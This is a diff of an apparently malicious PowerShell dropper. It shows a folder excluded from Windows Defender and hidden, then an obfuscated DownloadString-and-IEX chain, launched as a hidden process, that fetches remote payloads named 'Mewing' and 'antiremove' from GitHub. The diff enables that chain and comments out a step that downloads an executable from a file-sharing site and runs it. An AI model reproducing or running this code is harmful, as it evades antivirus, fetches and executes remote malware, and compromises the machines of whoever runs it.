@@ -93,9 +93,9 @@ New-Item -ItemType Directory -Path $dir
 Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 
-# $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/Mewing")
-# $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-# Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/Mewing")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
 $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/antiremove")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
@@ -111,15 +111,15 @@ Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -Pas
 # $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 # Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
-$url = "https://anonsharing.com/file/efaac0ebb2c760d9/H-Output.exe"
-$output = "$dir\T_T.exe"
-if (Test-Path -Path $output) {
-    Write-Host "hello"
-} else {
-    Invoke-WebRequest -Uri $url -OutFile $output
-    Start-Process $output
-    Write-Host "Tệp đã được tải về thành công."
-}
+# $url = "https://anonsharing.com/file/efaac0ebb2c760d9/H-Output.exe"
+# $output = "$dir\T_T.exe"
+# if (Test-Path -Path $output) {
+#     Write-Host "hello"
+# } else {
+#     Invoke-WebRequest -Uri $url -OutFile $output
+#     Start-Process $output
+#     Write-Host "Tệp đã được tải về thành công."
+# }
 
 
 
